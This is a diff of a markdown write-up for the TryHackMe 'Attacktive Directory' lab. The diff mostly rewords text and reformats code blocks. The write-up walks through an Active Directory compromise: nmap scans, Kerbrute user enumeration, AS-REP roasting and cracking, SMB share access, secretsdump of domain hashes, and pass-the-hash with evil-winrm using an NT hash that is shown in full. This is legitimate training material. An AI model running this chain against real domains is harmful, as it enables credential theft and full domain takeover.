@@ -22,23 +22,22 @@ tags:
 # Introduction
 -------------
 
-This writeup documents the penetration testing of the [**Attacktive Directory**](https://tryhackme.com/room/attacktivedirectory) machine from the [**TryHackMe**](https://tryhackme.com/) platform.
-
-In this ocasion, I'll enumerate users, find users to do ASREPRoasting to generate a ticket , then enumerate shares as this user and finally perform Kerberoasting and perform PTH over this user.
+This writeup documents the penetration testing of the [**Attacktive Directory**](https://tryhackme.com/room/attacktivedirectory) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this ocasion, I'll enumerate users, find users to do ASREPRoasting to generate a ticket , then enumerate shares as this user and finally perform Kerberoasting and perform PTH over this user.
 
 <br>
 # Information Gathering
 ------------------
 
-Once we have discovered the IP of the machine we need to enumerate as much information as possible.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
 
-When we ping a machine that is in our local network, normally:
-* TTL 64: Linux machine.
-* TTL 128: Windows machine.
-We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.
+A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+* TTL 64: Linux.
+* TTL 128: Windows.
 
-```java
+```bash
 ❯ ping -c 1 10.10.221.181
+```
+```
 PING 10.10.221.181 (10.10.221.181) 56(84) bytes of data.
 64 bytes from 10.10.221.181: icmp_seq=1 ttl=127 time=54.5 ms
 
@@ -47,10 +46,12 @@ PING 10.10.221.181 (10.10.221.181) 56(84) bytes of data.
 rtt min/avg/max/mdev = 54.500/54.500/54.500/0.000 ms
 ```
 
-In this case, the target seems to be a Windows machine. Let's perform a port scan with nmap.
+In this case, the target seems to be a Windows machine. Let's perform some scans.
 
-```java
+```bash
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.221.181 -oG allPorts
+```
+```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:32 CET
 Initiating SYN Stealth Scan at 21:32
@@ -131,10 +132,10 @@ Nmap done: 1 IP address (1 host up) scanned in 55.71 seconds
            Raw packets sent: 275840 (12.137MB) | Rcvd: 60645 (2.426MB)
 ```
 
-Let's perform a deeper scan with the parameter ``-sCV`` over those ports.
-
-```java
+```bash
 ❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49675,49676,49679,49683,49696,49712 10.10.221.181 -oN targeted
+```
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 21:34 CET
 Nmap scan report for 10.10.221.181
 Host is up (0.080s latency).
@@ -219,8 +220,10 @@ I'll add this in my ``/etc/hosts`` file:
 
 Now, we can perform **bruteforce** over Kerberos (port 88) with the tool [**Kerbrute**](https://github.com/ropnop/kerbrute/releases) to enumerate users, passwords and even password spray. I'll use the wordlist that you can find in the description of this machine.
 
-```php
+```bash
 ❯ ./kerbrute_linux_amd64 userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt
+```
+```
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -256,11 +259,17 @@ The notable accounts of this list are ``svc-admin`` and ``backup``.
 
 ```bash
 ❯ GetNPUsers.py spookysec.local/svc-admin -no-pass
+```
+```
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for svc-admin
 $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0afe***REDACTED_HASH***
+```
+```bash
 ❯ GetNPUsers.py spookysec.local/backup -no-pass
+```
+```
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Getting TGT for backup
@@ -273,6 +282,8 @@ The hash is a ``Kerberos 5 AS-REP etype 23``, mode 18200. Now, I'll try to crack
 
 ```bash
 ❯ john -w:../scripts/passwordlist.txt hash
+```
+```
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 7 OpenMP threads
@@ -285,8 +296,10 @@ Session completed.
 
 We have valid credentials in the domain, so now we can attempt to enumerate shared resources of the DC. I'll use ``smbclient``.
 
-```python
+```bash
 ❯ smbclient -L //10.10.221.181 -U svc-admin
+```
+```
 Password for [WORKGROUP\svc-admin]:
 
 	Sharename       Type      Comment
@@ -317,6 +330,8 @@ We have base64 encoded backup credentials. Let's decode the credentials of the b
 
 ```bash
 ❯ echo "***REDACTED***" | base64 -d; echo
+```
+```
 ***REDACTED***
 ```
 
@@ -328,8 +343,10 @@ The backup user is the backup account for the Domain Controller. This account ha
 
 I'll use a Impacket tool called ``secretsdump.py``. This will dump all password hashes that this user has.
 
-```python
+```bash
 ❯ secretsdump.py -just-dc backup@spookysec.local
+```
+```
 ...
 Administrator:500:***REDACTED***:::
 ...
@@ -337,8 +354,10 @@ Administrator:500:***REDACTED***:::
 
 Now, let's perform PTH.
 
-```python
+```bash
 ❯ evil-winrm -i 10.10.221.181 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+```
+```
 Evil-WinRM shell v3.7
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
